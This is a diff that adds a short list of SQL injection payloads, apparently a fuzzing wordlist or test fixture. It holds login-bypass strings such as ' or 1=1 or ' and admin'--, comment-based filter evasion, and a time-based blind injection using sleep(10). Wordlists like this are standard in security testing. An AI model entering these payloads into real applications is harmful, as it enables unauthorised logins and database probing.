@@ -1,0 +1,6 @@
+' or 1=1 or '
+admin'--
+admin'#
+/*comment*/
+/*!32302 1/0, */
+'; SELECT sleep(10)
